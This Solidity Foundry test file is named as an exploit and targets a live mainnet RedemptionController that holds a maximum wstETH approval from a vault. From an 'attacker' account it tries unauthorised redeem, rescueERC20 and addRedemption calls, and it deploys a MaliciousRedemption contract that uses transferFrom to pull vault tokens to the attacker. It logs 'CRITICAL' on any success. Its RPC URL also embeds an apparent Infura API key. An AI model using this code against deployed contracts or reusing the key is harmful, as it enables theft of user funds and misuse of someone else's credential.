// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRedemptionController {
    function UNDERLYING() external view returns (address);
    function VAULT() external view returns (address);
    function redeem(uint256 amount, address to) external;
    function rescueERC20(address token, address to, uint256 amount) external;
    function rescueETH(address to) external;
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function pauser() external view returns (address);
    function rescuer() external view returns (address);
    function getRedemptionContracts() external view returns (address[] memory);
    function addRedemption(address) external;
    function removeRedemption(address) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract RedemptionControllerExploit is Test {
    // CRITICAL: This contract has MAX approval from Vault for wstETH
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionController() public view {
        console.log("=== REDEMPTION CONTROLLER ANALYSIS ===\n");

        IRedemptionController rc = IRedemptionController(REDEMPTION_CONTROLLER);

        console.log("RedemptionController:", REDEMPTION_CONTROLLER);
        console.log("UNDERLYING:", rc.UNDERLYING());
        console.log("VAULT:", rc.VAULT());
        console.log("Owner:", rc.owner());
        console.log("Paused:", rc.paused());
        console.log("Pauser:", rc.pauser());
        console.log("Rescuer:", rc.rescuer());

        // Check redemption contracts
        address[] memory redemptions = rc.getRedemptionContracts();
        console.log("\nRedemption contracts:");
        for (uint i = 0; i < redemptions.length; i++) {
            console.log("  ", redemptions[i]);
        }

        // Verify Vault approval
        uint256 approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_CONTROLLER);
        console.log("\nVault wstETH approval to RC:", approval);
        if (approval == type(uint256).max) {
            console.log("*** MAX APPROVAL CONFIRMED ***");
        }
    }

    function test_TryRedeemDirect() public {
        console.log("=== TRYING DIRECT REDEEM ===\n");

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling redeem directly
        console.log("\nTrying redeem(1e18, attacker)...");
        try IRedemptionController(REDEMPTION_CONTROLLER).redeem(1e18, attacker) {
            console.log("CRITICAL: redeem succeeded!");
        } catch Error(string memory reason) {
            console.log("redeem failed:", reason);
        } catch (bytes memory data) {
            console.log("redeem failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_TryRescueERC20() public {
        console.log("=== TRYING RESCUE ERC20 ===\n");

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling rescueERC20
        console.log("\nTrying rescueERC20(wstETH, attacker, 1e18)...");
        try IRedemptionController(REDEMPTION_CONTROLLER).rescueERC20(wstETH, attacker, 1e18) {
            console.log("CRITICAL: rescueERC20 succeeded!");
        } catch Error(string memory reason) {
            console.log("rescueERC20 failed:", reason);
        } catch (bytes memory data) {
            console.log("rescueERC20 failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_TryAddRedemption() public {
        console.log("=== TRYING ADD REDEMPTION ===\n");

        vm.startPrank(attacker);

        // If we can add ourselves as a redemption contract...
        console.log("Trying addRedemption(attacker)...");
        try IRedemptionController(REDEMPTION_CONTROLLER).addRedemption(attacker) {
            console.log("CRITICAL: addRedemption succeeded!");
        } catch Error(string memory reason) {
            console.log("addRedemption failed:", reason);
        } catch (bytes memory data) {
            console.log("addRedemption failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_ExploitViaRedemptionContract() public {
        console.log("=== EXPLOIT VIA FAKE REDEMPTION CONTRACT ===\n");

        // Get existing redemption contracts
        address[] memory redemptions = IRedemptionController(REDEMPTION_CONTROLLER).getRedemptionContracts();
        console.log("Redemption contracts count:", redemptions.length);

        if (redemptions.length > 0) {
            console.log("First redemption:", redemptions[0]);

            // Check what interface this redemption contract has
            // It might have a redeem function that we can exploit

            vm.startPrank(attacker);

            // Try calling the redemption contract directly
            (bool success, bytes memory data) = redemptions[0].call(
                abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
            );
            console.log("Direct redeem on redemption[0] success:", success);

            vm.stopPrank();
        }

        // Deploy a malicious redemption contract
        vm.startPrank(attacker);

        MaliciousRedemption malicious = new MaliciousRedemption(VAULT, wstETH, attacker);
        console.log("\nMalicious redemption deployed:", address(malicious));

        // Try to register it
        console.log("Trying to register malicious redemption...");
        try IRedemptionController(REDEMPTION_CONTROLLER).addRedemption(address(malicious)) {
            console.log("CRITICAL: Registered malicious redemption!");
        } catch {
            console.log("Cannot register - requires owner");
        }

        vm.stopPrank();
    }

    function test_AnalyzeRedemptionContracts() public view {
        console.log("=== ANALYZING REDEMPTION CONTRACTS ===\n");

        address[] memory redemptions = IRedemptionController(REDEMPTION_CONTROLLER).getRedemptionContracts();

        for (uint i = 0; i < redemptions.length; i++) {
            console.log("\n--- Redemption", i, "---");
            console.log("Address:", redemptions[i]);

            bytes memory code = redemptions[i].code;
            console.log("Code size:", code.length);

            // Check if it has vault()
            (bool success, bytes memory data) = redemptions[i].staticcall(
                abi.encodeWithSignature("vault()")
            );
            if (success && data.length == 32) {
                address vault = abi.decode(data, (address));
                console.log("vault():", vault);
            }

            // Check if it has owner()
            (success, data) = redemptions[i].staticcall(
                abi.encodeWithSignature("owner()")
            );
            if (success && data.length == 32) {
                address owner = abi.decode(data, (address));
                console.log("owner():", owner);
            }

            // Check for common functions
            (success,) = redemptions[i].staticcall(
                abi.encodeWithSignature("redeem(uint256,address)")
            );
            console.log("Has redeem(uint256,address):", success);

            (success,) = redemptions[i].staticcall(
                abi.encodeWithSignature("execute(address,bytes)")
            );
            console.log("Has execute(address,bytes):", success);
        }
    }
}

contract MaliciousRedemption {
    address public vault;
    address public token;
    address public owner;

    constructor(address _vault, address _token, address _owner) {
        vault = _vault;
        token = _token;
        owner = _owner;
    }

    // If RedemptionController calls this, we can redirect tokens
    function redeem(uint256 amount, address to) external {
        // Try to transfer from vault to owner
        IERC20(token).transferFrom(vault, owner, amount);
    }

    receive() external payable {}
}
